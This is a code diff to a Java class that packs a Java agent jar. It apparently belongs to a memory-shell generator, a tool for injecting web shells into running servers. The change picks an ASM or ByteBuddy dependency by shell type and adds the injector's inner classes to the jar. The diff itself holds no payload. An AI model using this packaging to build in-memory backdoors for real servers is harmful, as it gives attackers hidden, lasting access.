@@ -4,6 +4,7 @@ import com.reajason.javaweb.memshell.config.GenerateResult;
 import lombok.SneakyThrows;
 import net.bytebuddy.ByteBuddy;
 import org.apache.commons.io.IOUtils;
+import org.objectweb.asm.Opcodes;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -13,6 +14,7 @@ import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Enumeration;
+import java.util.Map;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
 import java.util.jar.JarOutputStream;
@@ -40,7 +42,11 @@ public class AgentJarPacker implements JarPacker {
         manifest.getMainAttributes().putValue("Can-Retransform-Classes", "true");
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         try (JarOutputStream targetJar = new JarOutputStream(byteArrayOutputStream, manifest)) {
-            addDependency(targetJar, ByteBuddy.class);
+            if (generateResult.getShellConfig().getShellType().endsWith("ASM")) {
+                addDependency(targetJar, Opcodes.class);
+            } else {
+                addDependency(targetJar, ByteBuddy.class);
+            }
 
             targetJar.putNextEntry(new JarEntry(mainClass.replace('.', '/') + ".class"));
             targetJar.write(generateResult.getInjectorBytes());
@@ -49,6 +55,12 @@ public class AgentJarPacker implements JarPacker {
             targetJar.putNextEntry(new JarEntry(advisorClass.replace('.', '/') + ".class"));
             targetJar.write(generateResult.getShellBytes());
             targetJar.closeEntry();
+
+            for (Map.Entry<String, byte[]> entry : generateResult.getInjectorInnerClassBytes().entrySet()) {
+                targetJar.putNextEntry(new JarEntry(entry.getKey().replace('.', '/') + ".class"));
+                targetJar.write(entry.getValue());
+                targetJar.closeEntry();
+            }
         }
         return byteArrayOutputStream.toByteArray();
     }
